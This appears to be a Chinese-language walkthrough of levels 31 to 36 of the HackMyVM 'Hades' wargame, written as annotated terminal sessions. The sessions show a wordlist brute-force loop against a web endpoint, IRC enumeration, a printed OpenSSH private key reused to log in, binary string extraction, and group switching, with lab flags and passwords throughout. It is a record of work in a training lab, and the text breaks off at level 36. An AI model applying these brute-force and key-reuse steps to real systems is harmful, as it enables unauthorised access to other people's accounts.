## 31 halcyon
```bash
halcyon@hades:~$ ls -la
total 32
drwxr-x--- 2 root    halcyon 4096 Apr  5 06:36 .
drwxr-xr-x 1 root    root    4096 Apr  5 06:36 ..
-rw-r--r-- 1 halcyon halcyon  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 halcyon halcyon 3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 halcyon halcyon  807 Apr 23  2023 .profile
-rw-r----- 1 root    halcyon   22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root    halcyon  252 Apr  5 06:36 mission.txt
halcyon@hades:~$ grep -ra '\^*\^' .
./flagz.txt:^YBkkiwOiBVdzLnxXPdU^
halcyon@hades:~$ cat mission.txt 
################
# MISSION 0x31 #
################

## EN ##
The user hebe has one 'magicword' to get her password using http://localhost/req.php 

## ES ##
La usuaria hebe tiene una 'magicword' para obtener su password usando http://localhost/req.php
halcyon@hades:~$ curl -is http://localhost/req.php
HTTP/1.1 200 OK
Server: nginx/1.22.1
Date: Wed, 03 Jul 2024 14:32:42 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive


NO...
halcyon@hades:~$ curl -is http://localhost/req.php?magicword=whoami
HTTP/1.1 200 OK
Server: nginx/1.22.1
Date: Wed, 03 Jul 2024 14:33:59 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive


NO...

```
使用别人传上去的字典进行爆破，或者传rockyou.txt前 1000 个单词进行爆破:
```bash
halcyon@hades:~$ for i in $(cat /var/tmp/31/123.txt); do curl -s http://localhost/req.php?magicword=$i; done | grep -v "NO..." | sed '/^$/d'
tOlbuBLjFWntVDNmjHIG 
```
- /^$/ 是一个正则表达式模式，用于匹配空白行。 
  - ^ 表示行的开始。 
  - $ 表示行的结束。 
- ^$ 结合起来就匹配了一个没有任何字符的行，即空白行。
- d 是一个 sed 命令，表示删除匹配到的行。

## 32 hebe
```bash
hebe@hades:~$ ls -la
total 32
drwxr-x--- 2 root hebe 4096 Apr  5 06:36 .
drwxr-xr-x 1 root root 4096 Apr  5 06:36 ..
-rw-r--r-- 1 hebe hebe  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 hebe hebe 3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 hebe hebe  807 Apr 23  2023 .profile
-rw-r----- 1 root hebe   22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root hebe  232 Apr  5 06:36 mission.txt
hebe@hades:~$ cat mission.txt 
################
# MISSION 0x32 #
################

## EN ##
User hera refuses to use Discord, she prefer an older and open source service.

## ES ##
La usuaria hera se niega a usar Discord, prefiere un medio mas antiguo y abierto.
hebe@hades:~$ cat flagz.txt 
^BAWnwGCghvcBbbRcZVd^
hebe@hades:~$ sudo -l
[sudo] password for hebe: 
Sorry, user hebe may not run sudo on hades.
hebe@hades:~$ ss -atlup
-bash: /usr/bin/ss: Permission denied
hebe@hades:~$ /var/tmp/busybox netstat -atlup
netstat: can't scan /proc - are you root?
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 localhost:38595         0.0.0.0:*               LISTEN      -
tcp        0      0 localhost:ircd          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:http            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN      -
tcp        0    468 hades:ssh               218.201.30.54:13155     ESTABLISHED -
tcp        0      0 localhost:47738         localhost:ssh           ESTABLISHED -
tcp        0      0 localhost:ssh           localhost:47738         ESTABLISHED -
tcp        0      0 :::1965                 :::*                    LISTEN      -
tcp        0      0 :::http                 :::*                    LISTEN      -
tcp        0      0 :::ftp                  :::*                    LISTEN      -
tcp        0      0 :::ssh                  :::*                    LISTEN      -
udp        0      0 localhost:56483         0.0.0.0:*                           -
udp        0      0 0.0.0.0:44595           0.0.0.0:*                           -
udp        0      0 0.0.0.0:55168           0.0.0.0:*                           -
hebe@hades:~$ /var/tmp/busybox netstat -tlnup
netstat: can't scan /proc - are you root?
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.11:38595        0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:6667          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 :::1965                 :::*                    LISTEN      -
tcp        0      0 :::80                   :::*                    LISTEN      -
tcp        0      0 :::21                   :::*                    LISTEN      -
tcp        0      0 :::22                   :::*                    LISTEN      -
udp        0      0 127.0.0.11:56483        0.0.0.0:*                           -
udp        0      0 0.0.0.0:44595           0.0.0.0:*                           -
udp        0      0 0.0.0.0:55168           0.0.0.0:*                           -
```
发现了一个通讯的
IRCd（Internet Relay Chat Daemon）是互联网中继聊天协议（IRC）的守护进程或服务器软件，它允许用户通过网络进行实时聊天，尝试进行利用，可以参考:https://book.hacktricks.xyz/v/cn/network-services-pentesting/pentesting-irc
```bash
hebe@hades:~$ /var/tmp/busybox nc localhost:6667
:hades.hmv NOTICE * :*** Looking up your hostname...
:hades.hmv NOTICE * :*** Could not resolve your hostname: Request timed out; using your IP address (127.0.0.1) instead.
USER ran213eqdw123 0 * ran213eqdw123
NICK ran213eqdw123
:hades.hmv 001 ran213eqdw123 :Welcome to the Devilnet IRC Network ran213eqdw123!ran213eqdw@127.0.0.1
:hades.hmv 002 ran213eqdw123 :Your host is hades.hmv, running version InspIRCd-3
:hades.hmv 003 ran213eqdw123 :This server was created 20:29:01 Jun 06 2024
:hades.hmv 004 ran213eqdw123 hades.hmv InspIRCd-3 iosw Pbiklmnopstv :bklov
:hades.hmv 005 ran213eqdw123 AWAYLEN=200 CASEMAPPING=rfc1459 CHANLIMIT=#:20 CHANMODES=b,k,l,Pimnpst CHANNELLEN=64 CHANTYPES=# ELIST=CMNTU HOSTLEN=64 KEYLEN=32 KICKLEN=255 LINELEN=512 MAXLIST=b:100 :are supported by this server
:hades.hmv 005 ran213eqdw123 MAXTARGETS=20 MODES=20 NAMELEN=128 NETWORK=Devilnet NICKLEN=30 PREFIX=(ov)@+ SAFELIST STATUSMSG=@+ TOPICLEN=307 USERLEN=10 USERMODES=,,s,iow WHOX :are supported by this server
:hades.hmv 251 ran213eqdw123 :There are 0 users and 0 invisible on 1 servers
:hades.hmv 253 ran213eqdw123 1 :unknown connections
:hades.hmv 254 ran213eqdw123 1 :channels formed
:hades.hmv 255 ran213eqdw123 :I have 0 clients and 0 servers
:hades.hmv 265 ran213eqdw123 :Current local users: 0  Max: 3
:hades.hmv 266 ran213eqdw123 :Current global users: 0  Max: 3
:hades.hmv 422 ran213eqdw123 :Message of the day file is missing.
LIST
:hades.hmv 321 ran213eqdw123 Channel :Users Name
:hades.hmv 322 ran213eqdw123 #channel666 0 :[+Pnt] Welcome hacker! Take it: JzpyRXRzWoHKZwgWzleM
:hades.hmv 323 ran213eqdw123 :End of channel list.
```
除此之外其他命令也尝试了，但是没有啥有用的：
```bash
HELP
:hades.hmv 421 patrick HELP :Unknown command
VERSION
:hades.hmv 351 patrick InspIRCd-3. hades.hmv :
:hades.hmv 005 patrick AWAYLEN=200 CASEMAPPING=rfc1459 CHANLIMIT=#:20 CHANMODES=b,k,l,Pimnpst CHANNELLEN=64 CHANTYPES=# ELIST=CMNTU HOSTLEN=64 KEYLEN=32 KICKLEN=255 LINELEN=512 MAXLIST=b:100 :are supported by this server
:hades.hmv 005 patrick MAXTARGETS=20 MODES=20 NAMELEN=128 NETWORK=Devilnet NICKLEN=30 PREFIX=(ov)@+ SAFELIST STATUSMSG=@+ TOPICLEN=307 USERLEN=10 USERMODES=,,s,iow WHOX :are supported by this server
HELP
:hades.hmv 421 patrick HELP :Unknown command
INFO
:hades.hmv 371 patrick :                   -/\- InspIRCd -\/-
:hades.hmv 371 patrick :                 November 2002 - Present
:hades.hmv 371 patrick :
:hades.hmv 371 patrick :Core Developers:
:hades.hmv 371 patrick :    Matt Schatz,            genius3000, <genius3000@g3k.solutions>
:hades.hmv 371 patrick :    Sadie Powell,           SadieCat,   <sadie@witchery.services>
:hades.hmv 371 patrick :
:hades.hmv 371 patrick :Former Developers:
:hades.hmv 371 patrick :    Attila Molnar,          Attila,     <attilamolnar@hush.com>
:hades.hmv 371 patrick :    Daniel De Graaf,        danieldg,   <danieldg@inspircd.org>
:hades.hmv 371 patrick :    Dennis Friis,           peavey,     <peavey@inspircd.org>
:hades.hmv 371 patrick :    John Brooks,            Special,    <special@inspircd.org>
:hades.hmv 371 patrick :    Matt Smith,             dz,         <dz@inspircd.org>
:hades.hmv 371 patrick :    Oliver Lupton,          Om,         <om@inspircd.org>
:hades.hmv 371 patrick :    Thomas Stagner,         aquanight,  <aquanight@inspircd.org>
:hades.hmv 371 patrick :    Uli Schlachter,         psychon,    <psychon@inspircd.org>
:hades.hmv 371 patrick :
:hades.hmv 371 patrick :Founding Developers:
:hades.hmv 371 patrick :    Craig Edwards,          Brain,      <brain@inspircd.org>
:hades.hmv 371 patrick :    Craig McLure,           Craig,      <craig@inspircd.org>
:hades.hmv 371 patrick :    Robin Burchell,         w00t,       <w00t@inspircd.org>
:hades.hmv 371 patrick :
:hades.hmv 371 patrick :Active Contributors:
:hades.hmv 371 patrick :   Adam            progval         Robby
:hades.hmv 371 patrick :
:hades.hmv 371 patrick :Former Contributors:
:hades.hmv 371 patrick :   Adremelech      Ankit           AnMaster        Bricker
:hades.hmv 371 patrick :   BuildSmart      Burlex          CC              ChrisTX
:hades.hmv 371 patrick :   Dan             djGrrr          dmb             eggy
:hades.hmv 371 patrick :   fraggeln        GreenReaper     HiroP           jackmcbarn
:hades.hmv 371 patrick :   jamie           Jason           jilles          John2
:hades.hmv 371 patrick :   kaniini         LeaChim         linuxdaemon     MacGyver
:hades.hmv 371 patrick :   majic           Namegduf        owine           Phoenix
:hades.hmv 371 patrick :   pippijn         praetorian      Quension        satmd
:hades.hmv 371 patrick :   Shawn           Sheogorath      Shutter         skenmy
:hades.hmv 371 patrick :   Skip            Stskeeps        Taros           ThaPrince
:hades.hmv 371 patrick :   Thunderhacker   typobox43       Zaba
:hades.hmv 371 patrick :
:hades.hmv 371 patrick :Thanks To:
:hades.hmv 371 patrick :   Asmo            Brik            dan-            Duck
:hades.hmv 371 patrick :   jwheare         prawnsalad
:hades.hmv 371 patrick :
:hades.hmv 371 patrick : Best experienced with an IRC client
:hades.hmv 374 patrick :End of /INFO list
LINKS
:hades.hmv 364 patrick hades.hmv hades.hmv :0 Devil IRC Server
:hades.hmv 365 patrick * :End of /LINKS list.
HELPOP USERCMDS
:hades.hmv 421 patrick HELPOP :Unknown command
ADMIN
:hades.hmv 256 patrick hades.hmv :Administrative info
:hades.hmv 257 patrick :Name: Devil
:hades.hmv 258 patrick :Nickname: Devil
:hades.hmv 259 patrick :Email: root@localhost
USERS
:hades.hmv 446 patrick :USERS has been disabled
TIME
:hades.hmv 391 patrick hades.hmv :Wed Jul 03 2024 15:08:12
STATS a
:hades.hmv 481 patrick :Permission Denied - STATS a requires the servers/auspex priv.
NAMES 
:hades.hmv 366 patrick * :End of /NAMES list.
```

## 33 hera
```bash
hera@hades:~$ ls -la
total 40
drwxr-x--- 3 root hera 4096 Apr  5 06:36 .
drwxr-xr-x 1 root root 4096 Apr  5 06:36 ..
-rw-r----- 1 root hera  127 Apr  5 06:36 .bash_history
-rw-r--r-- 1 hera hera  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 hera hera 3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 hera hera  807 Apr 23  2023 .profile
drwxr-xr-x 2 root root 4096 Apr  5 06:36 .ssh
-rw-r----- 1 root hera   22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root hera  182 Apr  5 06:36 mission.txt
hera@hades:~$ grep -ra '\^*\^' .
./.bash_history:^LVFcQoSJeZgUltXJKnpZ^
./flagz.txt:^GaIAyNGsSRYClSuzVLX^
hera@hades:~$ cat mission.txt 
################
# MISSION 0x33 #
################

## EN ##
User hermione would like to know what hera was doing.

## ES ##
A la usuaria hermione le gustaria saber que hacia hera.
hera@hades:~$ cd .ssh
hera@hades:~/.ssh$ ls -la
total 16
drwxr-xr-x 2 root root 4096 Apr  5 06:36 .
drwxr-x--- 3 root hera 4096 Apr  5 06:36 ..
-rw-r----- 1 root hera  568 Apr  5 06:36 authorized_keys
-rw-r----- 1 root hera 2590 Apr  5 06:36 id_rsa
hera@hades:~/.ssh$ cat authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHnkVd725zQHWzxW8JJFcTlmQRh2nQGEIiwsZo5dz+C99HqV9jwhryrJ6oucxjlwLatA5Fn270JFTdwHxaqFHQxHRHQBJoApbsVF3zpvhH5a+Y5GoDKToNDKU63pCMgZtdFKPC0+1Yr3D0TO
1ijaZya9ne9mnY20dFFVfGH2sye95C+uiDO1XPmhntqRkj74l6O6I5YqauCjEbb2G4WE5Qp1hw/D10Tul0gCCj9FT/Y4dSgFjzefRxT9JN1927NKmaNCuCfIs8vXeq6Z+wYzF+Obh6eFK4upLvG/P1w4fAyUZZb4LhtdFebhb1N3fjX9XbZtPR
010X8XMbzh6Q53iGifb9rgyFGcGGOTv0OQPCOtWsV+JvmCZR36wCbWE7t7UT9Mmt/zhnYzwhAoGbZX7WaieWS/W8kCvMzZzLbiq2mKOJ9obgFATvaKPc/8eValOhif1wFrbvvuQyAkuFkPMSFffjPxAU7U54L3DlypgTo3oS33X1pPvD8kfINZRcRSk= hera@hades.hmv
hera@hades:~/.ssh$ cat id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
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
FdNGMEWYEiXx8AAAALdGVzdGVAZGViMTE=
-----END OPENSSH PRIVATE KEY-----

```
拷到本地，发现是可以进行登录的：
```bash
hgbe02@pwn:~/temp$ chmod 600 id_rsa
hgbe02@pwn:~/temp$ ssh -i id_rsa hera@hades.hackmyvm.eu -p 6666

                                                      .     **
                                                   *           *.
                                                                  ,*
                                                                     *,
                                             ,                         ,*
                                          .,                              *,
                                       /                                    *
                                    ,*                                        *,
                                 /.                                            .*.
                                                                _____
                __     __           _____         ____________      _____\    \            _____
                /  \   /  \        /      |_       \           \    /    / |    |      _____\    \
                /   /| |\   \      /         \       \           \  /    /  /___/|     /    / \    |
                /   //   \   \    |     /\    \       |    /\     ||    |__ |___|/    |    |  /___/|
                /    \_____/    \   |    |  |    \      |   |  |    ||       \       ____\    \ |   ||
                /    /\_____/\    \  |     \/      \     |    \/     ||     __/ __   /    /\    \|___|/
                /    //\_____/\    \ |\      /\     \   /           /||\    \  /  \ |    |/ \    \
                /____/ |       | \____\| \_____\ \_____\ /___________/ || \____\/    ||\____\ /____/|
                |    | |       | |    || |     | |     ||           | / | |    |____/|| |   ||    | |
                |____|/         \|____| \|_____|\|_____||___________|/   \|____|   | | \|___||____|/
                                                                        |___|/

                                       **                                    **.
                                          ,*                                **
                                             *,                          ,*
                                                *                      **
                                                *,                .*
                                                   *.           **
                                                      **      ,*,
                                                         ** *,
                                        [== HMVLabs Chapter 2: Hades ==]

                                         +===========================+
                                         |        Respect &          |
                                         |        Have fun!          |
                                         |                           |
                                         | https://hackmyvm.eu/hades |
                                         +===========================+


Linux hades 5.10.0-13-amd64 #1 SMP Debian 5.10.106-1 (2022-03-17) x86_64

                                                      .     **
                                                   *           *.
                                                                  ,*
                                                                     *,
                                             ,                         ,*
                                          .,                              *,
                                       /                                    *
                                    ,*                                        *,
                                 /.                                            .*.
                                                                _____
                __     __           _____         ____________      _____\    \            _____
                /  \   /  \        /      |_       \           \    /    / |    |      _____\    \
                /   /| |\   \      /         \       \           \  /    /  /___/|     /    / \    |
                /   //   \   \    |     /\    \       |    /\     ||    |__ |___|/    |    |  /___/|
                /    \_____/    \   |    |  |    \      |   |  |    ||       \       ____\    \ |   ||
                /    /\_____/\    \  |     \/      \     |    \/     ||     __/ __   /    /\    \|___|/
                /    //\_____/\    \ |\      /\     \   /           /||\    \  /  \ |    |/ \    \
                /____/ |       | \____\| \_____\ \_____\ /___________/ || \____\/    ||\____\ /____/|
                |    | |       | |    || |     | |     ||           | / | |    |____/|| |   ||    | |
                |____|/         \|____| \|_____|\|_____||___________|/   \|____|   | | \|___||____|/
                                                                        |___|/

                                       **                                    **.
                                          ,*                                **
                                             *,                          ,*
                                                *                      **
                                                *,                .*
                                                   *.           **
                                                      **      ,*,
                                                         ** *,
                                        [== HMVLabs Chapter 2: Hades ==]

                                         +===========================+
                                         |        Respect &          |
                                         |        Have fun!          |
                                         |                           |
                                         | https://hackmyvm.eu/hades |
                                         +===========================+


Last login: Wed Jul  3 15:09:59 2024 from 127.0.0.1
hera@hades:~$
```
接着信息搜集:
```bash
hera@hades:~/.ssh$ cd ..
hera@hades:~$ cat .bash_history 

ls
ps
sudo -u hermione bash
cp /etc /etc2
^LVFcQoSJeZgUltXJKnpZ^
ls
id
cat /usr/hera
rm /usr/hera
whoami
zip -R etc.zip /etc
hera@hades:~$ cat /usr/hera
vzhOebSSplFoXPKxwtqU
hera@hades:~$ find / -name etc.zip 2>/dev/null
```

## 34 hermione
```bash
hermione@hades:~$ ls -la
total 52
drwxr-x--- 1 root     hermione  4096 Apr  5 06:36 .
drwxr-xr-x 1 root     root      4096 Apr  5 06:36 ..
-rw-r--r-- 1 hermione hermione   220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 hermione hermione  3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 hermione hermione   807 Apr 23  2023 .profile
-rwxrwxrwx 1 hermione hermione 16056 Apr  5 06:36 beastgroup
-rw-r----- 1 root     hermione    22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root     hermione   158 Apr  5 06:36 mission.txt
hermione@hades:~$ grep -ra '\^*\^' .
./flagz.txt:^dLcEkLNgdDvOlxtPhjh^
@@@@�����   $$�-�=�=X`�-�=�=�888 XXXDDS�td888 P�tdL L L ,,Q�tdR�td�-�=�=00/lib64/ld-linux-x86-64.so.2GNU��GNU'�`�=>A�Ѣ��h������PGN�e�mV .r '� "puts__libc_start_main__cxa_finalizegetgidprintflibc.so.6GLIBC_2.2.5GLIBC_2.34_ITM_deregisterTMCloneTable__gmon_start___ITM_registerTMCloneTable5u⸮i    ?���K�P�  @�?�?�?�?�@@H�H��/H��t��H���5�/�%�/@�%�/h������%�/h������%�//u+UH�=�.H��t�I��^H��H���PTE1�1�H�=��//�f.�@H�=�/H�z/H9�tH�/H��t        �����H�=Q/H�5J/H)�H��H��?H��H�H��tH��.H����fD�����=
             H�=�.�)����d�����.]������w���UH��H��������E��}�
./beastgroup:�
              �?H@�     ������oP���o���o<���o�=6FV @GCC: (Debian 12.2.0-14) 12.2.0��    | ��� �3I⸮(@U�=|P��=������ !����=�L ��?� ` @->(@E�K^@k z @� ��⸮0@dp"�⸮(@�YJ�(@� �"
                                                                                                                                                                          Scrt1.o__abi
_tagcrtstuff.cderegister_tm_clones__do_global_dtors_auxcompleted.0__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entrybeastgroup.c__FRAME_END___DYNAMIC__GN
U_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE___libc_start_main@GLIBC_2.34_ITM_deregisterTMCloneTableputs@GLIBC_2.2.5_edata_finiprintf@GLIBC_2.2.5__data_start__gmon_start____dso_handle_IO_stdin
_usedgetgid@GLIBC_2.2.5_end__bss_startmain__TMC_END___ITM_registerTMCloneTable__cxa_finalize@GLIBC_2.2.5_init.symtab.strtab.shstrtab.interp.note.gnu.property.note.gnu.build-id.note.A
BI-tag.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.plt.got.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.dynamic.got.plt.data.bss.comment#886XX$I|| W���o��a
                 ��i���q���o<<~���oPP����B@@��  @�pp3���        �  �L L ,�x x ������=�-��?���?�@0
                                                                                               (@(0(0H0��3�5⸮
hermione@hades:~$ cat mission.txt 
################
# MISSION 0x34 #
################

## EN ##
User hero only talks to some groups.

## ES ##
La usuaria hero solo se habla con algunos grupos.
hermione@hades:~$ whoami;id
hermione
uid=2025(hermione) gid=2025(hermione) groups=2025(hermione),6666(beast)
hermione@hades:~$ group hero
-bash: group: command not found
hermione@hades:~$ ./beastgroup 

I only trust group 6666, you are group 2025
hermione@hades:~$ ls -la
total 52
drwxr-x--- 1 root     hermione  4096 Apr  5 06:36 .
drwxr-xr-x 1 root     root      4096 Apr  5 06:36 ..
-rw-r--r-- 1 hermione hermione   220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 hermione hermione  3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 hermione hermione   807 Apr 23  2023 .profile
-rwxrwxrwx 1 hermione hermione 16056 Apr  5 06:36 beastgroup
-rw-r----- 1 root     hermione    22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root     hermione   158 Apr  5 06:36 mission.txt
hermione@hades:~$ strings beastgroup 
/lib64/ld-linux-x86-64.so.2
puts
__libc_start_main
__cxa_finalize
getgid
printf
libc.so.6
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
I only trust group 6666, you are group %i
vlImTDSGnTMwLFgRWCOc
;*3$"
GCC: (Debian 12.2.0-14) 12.2.0
Scrt1.o
__abi_tag
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
beastgroup.c
__FRAME_END__
_DYNAMIC
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_start_main@GLIBC_2.34
_ITM_deregisterTMCloneTable
puts@GLIBC_2.2.5
_edata
_fini
printf@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
getgid@GLIBC_2.2.5
_end
__bss_start
main
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@GLIBC_2.2.5
_init
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
```
不过看群主操作的时候说这个办法好像是作弊，嘶，行吧，再想想其他办法:
```bash
hermione@hades:~$ ls -la
total 52
drwxr-x--- 1 root     hermione  4096 Apr  5 06:36 .
drwxr-xr-x 1 root     root      4096 Apr  5 06:36 ..
-rw-r--r-- 1 hermione hermione   220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 hermione hermione  3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 hermione hermione   807 Apr 23  2023 .profile
-rwxrwxrwx 1 hermione hermione 16056 Apr  5 06:36 beastgroup
-rw-r----- 1 root     hermione    22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root     hermione   158 Apr  5 06:36 mission.txt
hermione@hades:~$ newgrp beast
hermione@hades:~$ id
uid=2025(hermione) gid=6666(beast) groups=6666(beast),2025(hermione)
hermione@hades:~$ ./beastgroup 

vlImTDSGnTMwLFgRWCOc
```
使用`beast`切换主用户组即可！

## 35 hero
```bash
hero@hades:~$ ls -la 
total 48
drwxr-x--- 2 root hero  4096 Apr  5 06:36 .
drwxr-xr-x 1 root root  4096 Apr  5 06:36 ..
-rw-r--r-- 1 hero hero   220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 hero hero  3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 hero hero   807 Apr 23  2023 .profile
---s--s--- 1 root hero 16056 Apr  5 06:36 cleaner
-rw-r----- 1 root hero    22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root hero   173 Apr  5 06:36 mission.txt
hero@hades:~$ cat flagz.txt 
^KUEUoYgCWKlUTpywGeK^
hero@hades:~$ cat mission.txt 
################
# MISSION 0x35 #
################

## EN ##
User hestia likes to keep the screen clean.

## ES ##
A la usuaria hestia le gusta mantener la pantalla limpia.
hero@hades:~$ sudo -l
[sudo] password for hero: 
Sorry, user hero may not run sudo on hades.
hero@hades:~$ whoami;id
hero
uid=2026(hero) gid=2026(hero) groups=2026(hero)
hero@hades:~$ ./cleaner 
hero@hades:~$ ./cleaner 
hero@hades:~$ ./cleaner 
hero@hades:~$ clear
hero@hades:~$ find / -name hero -type f 2>/dev/null
hero@hades:~$ find / -group hero -type f 2>/dev/null
.........
hero@hades:~$ whoami;id 
hero
uid=2026(hero) gid=2226(her0) groups=2226(her0),2026(hero)
hero@hades:~$ find / -name her0 -type f 2>/dev/null
hero@hades:~$ find / -group her0 -type f 2>/dev/null | grep -v "proc"
/usr/share/libs
hero@hades:~$ cat /usr/share/libs
opTNnZQAuFJsauNPHXVq
```

## 36 hestia
```bash
hestia@hades:~$ whoami;id
hestia
